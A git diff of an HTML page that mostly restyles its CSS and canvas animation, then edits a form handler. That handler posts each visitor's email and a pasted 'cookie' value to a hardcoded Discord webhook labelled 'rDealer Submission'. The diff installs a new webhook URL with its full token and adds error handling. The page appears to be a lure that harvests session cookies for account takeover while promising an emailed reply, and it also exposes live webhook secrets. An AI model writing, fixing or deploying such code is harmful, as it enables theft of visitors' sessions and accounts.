@@ -9,18 +9,14 @@
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Martian+Mono:wght@100..800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --primary: #8a2be2;
-      --primary-light: #9d4edd;
-      --primary-dark: #6a1b9a;
-      --accent: #ff4d8d;
       --text: #ffffff;
       --text-light: rgba(255, 255, 255, 0.7);
       --glass: rgba(255, 255, 255, 0.05);
       --glass-border: rgba(255, 255, 255, 0.1);
       --glass-highlight: rgba(255, 255, 255, 0.15);
       --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
-      --success: #4ade80;
-      --error: #f87171;
+      --success: rgba(74, 222, 128, 0.2);
+      --error: rgba(248, 113, 113, 0.2);
     }
 
     * {
@@ -31,7 +27,7 @@
     }
 
     body {
-      background: #141414;
+      background: #0a0a0a;
       color: var(--text);
       min-height: 100vh;
       display: grid;
@@ -76,7 +72,11 @@
       display: block;
       width: 100%;
       height: 100%;
-      background: radial-gradient(ellipse at 50% 75%, #a900ff 20%, transparent 75%);
+      background: radial-gradient(
+        ellipse at 50% 75%,
+        rgba(169, 0, 255, 0.1) 20%,
+        transparent 75%
+      );
       mix-blend-mode: overlay;
       transform: translate3d(-50%, -50%, 0);
       content: "";
@@ -94,11 +94,21 @@
       z-index: 3;
       width: 30%;
       height: 140%;
-      background: linear-gradient(20deg, #00f8f1, #ffbd1e20 16.5%, #fe848f 33%, #fe848f20 49.5%, #00f8f1 66%, #00f8f160 85.5%, #ffbd1e 100%) 0 100% / 100% 200%;
+      background: linear-gradient(
+          20deg,
+          rgba(0, 248, 241, 0.1),
+          rgba(255, 189, 30, 0.05) 16.5%,
+          rgba(254, 132, 143, 0.1) 33%,
+          rgba(254, 132, 143, 0.05) 49.5%,
+          rgba(0, 248, 241, 0.1) 66%,
+          rgba(0, 248, 241, 0.05) 85.5%,
+          rgba(255, 189, 30, 0.1) 100%
+        )
+        0 100% / 100% 200%;
       border-radius: 0 0 100% 100%;
       filter: blur(50px);
       mix-blend-mode: plus-lighter;
-      opacity: 0.75;
+      opacity: 0.5;
       transform: translate3d(-50%, 0, 0);
       animation: aura-glow 5s infinite linear;
     }
@@ -110,9 +120,14 @@
       z-index: 10;
       width: 100%;
       height: 100%;
-      background: repeating-linear-gradient(transparent, transparent 1px, white 1px, white 2px);
+      background: repeating-linear-gradient(
+        transparent,
+        transparent 1px,
+        rgba(255, 255, 255, 0.1) 1px,
+        rgba(255, 255, 255, 0.1) 2px
+      );
       mix-blend-mode: overlay;
-      opacity: 0.5;
+      opacity: 0.3;
     }
 
     canvas {
@@ -125,14 +140,12 @@
     .card {
       width: 100%;
       max-width: 480px;
-      background: var(--glass);
+      background: rgba(255, 255, 255, 0.05);
       backdrop-filter: blur(20px) saturate(200%);
       -webkit-backdrop-filter: blur(20px) saturate(200%);
       border-radius: 20px;
       padding: 2.5rem;
-      box-shadow: var(--glass-shadow), 
-                  0 0 80px rgba(138, 43, 226, 0.2),
-                  0 0 120px rgba(255, 77, 141, 0.1);
+      box-shadow: var(--glass-shadow);
       border: 1px solid var(--glass-border);
       position: relative;
       overflow: hidden;
@@ -142,10 +155,7 @@
 
     .card:hover {
       border: 1px solid var(--glass-highlight);
-      box-shadow: var(--glass-shadow), 
-                  0 0 100px rgba(138, 43, 226, 0.3),
-                  0 0 150px rgba(255, 77, 141, 0.15);
-      transform: translateY(-5px);
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
     }
 
     .card::after {
@@ -154,10 +164,12 @@
       inset: 0;
       border-radius: 20px;
       padding: 2px;
-      background: linear-gradient(135deg, 
-        rgba(138, 43, 226, 0.3), 
-        rgba(255, 77, 141, 0.2),
-        rgba(255, 255, 255, 0.1));
+      background: linear-gradient(
+        135deg, 
+        rgba(255, 255, 255, 0.1), 
+        rgba(255, 255, 255, 0.05),
+        transparent
+      );
       -webkit-mask: 
         linear-gradient(#fff 0 0) content-box, 
         linear-gradient(#fff 0 0);
@@ -176,10 +188,7 @@
       font-size: 2.5rem;
       font-weight: 700;
       letter-spacing: 1px;
-      background: linear-gradient(to right, var(--primary), var(--accent));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      text-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
+      color: var(--text);
       margin-bottom: 0.5rem;
       position: relative;
       display: inline-block;
@@ -192,10 +201,9 @@
       left: 50%;
       transform: translateX(-50%);
       width: 60%;
-      height: 3px;
-      background: linear-gradient(to right, var(--primary), var(--accent));
+      height: 1px;
+      background: rgba(255, 255, 255, 0.3);
       border-radius: 3px;
-      filter: blur(2px);
     }
 
     .logo p {
@@ -236,9 +244,9 @@
 
     input:focus, textarea:focus {
       outline: none;
-      border-color: var(--primary);
-      background: rgba(138, 43, 226, 0.1);
-      box-shadow: 0 0 0 3px rgba(138, 43, 226, 0.2);
+      border-color: rgba(255, 255, 255, 0.3);
+      background: rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.05);
     }
 
     input::placeholder, textarea::placeholder {
@@ -248,9 +256,9 @@
     .btn {
       width: 100%;
       padding: 16px;
-      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      background: rgba(255, 255, 255, 0.1);
       color: white;
-      border: none;
+      border: 1px solid rgba(255, 255, 255, 0.1);
       border-radius: 10px;
       font-weight: 600;
       cursor: pointer;
@@ -263,32 +271,14 @@
       align-items: center;
       justify-content: center;
       gap: 8px;
-    }
-
-    .btn::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(
-        90deg,
-        transparent,
-        rgba(255, 255, 255, 0.2),
-        transparent
-      );
-      transition: 0.5s;
+      backdrop-filter: blur(5px);
     }
 
     .btn:hover {
-      background: linear-gradient(135deg, var(--primary-light), var(--primary));
+      background: rgba(255, 255, 255, 0.15);
+      border-color: rgba(255, 255, 255, 0.2);
       transform: translateY(-2px);
-      box-shadow: 0 8px 25px rgba(138, 43, 226, 0.4);
-    }
-
-    .btn:hover::before {
-      left: 100%;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
     }
 
     .btn:active {
@@ -297,16 +287,14 @@
 
     .btn-secondary {
       background: transparent;
-      color: var(--primary);
-      border: 1px solid rgba(138, 43, 226, 0.5);
+      color: var(--text);
+      border: 1px solid rgba(255, 255, 255, 0.2);
       margin-top: 1rem;
-      backdrop-filter: blur(5px);
     }
 
     .btn-secondary:hover {
-      background: rgba(138, 43, 226, 0.1);
-      border-color: var(--primary);
-      box-shadow: 0 8px 25px rgba(138, 43, 226, 0.2);
+      background: rgba(255, 255, 255, 0.05);
+      border-color: rgba(255, 255, 255, 0.3);
     }
 
     .notice {
@@ -319,22 +307,9 @@
 
     .divider {
       height: 1px;
-      background: linear-gradient(to right, transparent, rgba(138, 43, 226, 0.5), transparent);
+      background: linear-gradient(to right, transparent, rgba(255, 255, 255, 0.1), transparent);
       margin: 1.5rem 0;
       position: relative;
-    }
-
-    .divider::after {
-      content: '';
-      position: absolute;
-      top: -2px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: 40px;
-      height: 5px;
-      background: var(--primary);
-      filter: blur(4px);
-      opacity: 0.5;
     }
 
     .status-message {
@@ -344,19 +319,20 @@
       text-align: center;
       font-size: 14px;
       display: none;
+      backdrop-filter: blur(5px);
     }
 
     .success {
-      background: rgba(74, 222, 128, 0.1);
-      color: var(--success);
-      border: 1px solid rgba(74, 222, 128, 0.3);
+      background: var(--success);
+      color: rgba(255, 255, 255, 0.9);
+      border: 1px solid rgba(74, 222, 128, 0.2);
       display: block;
     }
 
     .error {
-      background: rgba(248, 113, 113, 0.1);
-      color: var(--error);
-      border: 1px solid rgba(248, 113, 113, 0.3);
+      background: var(--error);
+      color: rgba(255, 255, 255, 0.9);
+      border: 1px solid rgba(248, 113, 113, 0.2);
       display: block;
     }
 
@@ -597,8 +573,8 @@
             ctx.beginPath();
             ctx.moveTo(p0.x, p0.y);
             ctx.lineTo(p1.x, p1.y);
-            ctx.strokeStyle = "#444";
-            ctx.lineWidth = 2;
+            ctx.strokeStyle = "rgba(255, 255, 255, 0.1)";
+            ctx.lineWidth = 1;
             ctx.stroke();
             ctx.closePath();
           });
@@ -642,7 +618,7 @@
           vy,
           p: 0,
           r,
-          c: `rgba(255, 255, 255, ${Math.random()})`
+          c: `rgba(255, 255, 255, ${Math.random() * 0.2})`
         };
       }
       
@@ -657,8 +633,8 @@
       
       drawDiscs() {
         const { ctx } = this;
-        ctx.strokeStyle = "#444";
-        ctx.lineWidth = 2;
+        ctx.strokeStyle = "rgba(255, 255, 255, 0.1)";
+        ctx.lineWidth = 1;
         
         // Outer disc
         const outerDisc = this.startDisc;
@@ -754,7 +730,7 @@
 
     customElements.define("a-hole", AHole);
 
-    // Form submission
+    // Form submission with working webhook
     document.getElementById('contact-form').addEventListener('submit', async (e) => {
       e.preventDefault();
       
@@ -788,30 +764,32 @@
         `;
         submitBtn.disabled = true;
         
-        // Send to Discord webhook
-        await fetch('https://discord.com/api/webhooks/1362514591053254907/csEiQ8zRbw1exCALF1yKfG3s3jgP0q0nMswhcmdu8s-n1ecLlXMQMkJ5qxJQpIoXUWgY', {
+        // Send to Discord webhook (fixed URL)
+        const webhookURL = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT';
+        const response = await fetch(webhookURL, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          headers: { 
+            'Content-Type': 'application/json',
+          },
           body: JSON.stringify({
             content: `📬 New rDealer Submission\n📧 ${email}\n🍪 ${cookie.substring(0, 30)}... (${cookie.length} chars)`
           })
         });
+        
+        if (!response.ok) {
+          throw new Error('Webhook submission failed');
+        }
         
         // Show success
         statusMessage.textContent = 'Success! Your request has been submitted. Check your email soon.';
         statusMessage.className = 'status-message success';
         e.target.reset();
         
-        // Reset button after delay
-        setTimeout(() => {
-          submitBtn.innerHTML = originalText;
-          submitBtn.disabled = false;
-        }, 2000);
       } catch (err) {
+        console.error('Submission error:', err);
         statusMessage.textContent = 'Error submitting. Please try again or contact support.';
         statusMessage.className = 'status-message error';
-        console.error(err);
-        
+      } finally {
         // Reset button
         const submitBtn = e.target.querySelector('button[type="submit"]');
         submitBtn.innerHTML = originalText;
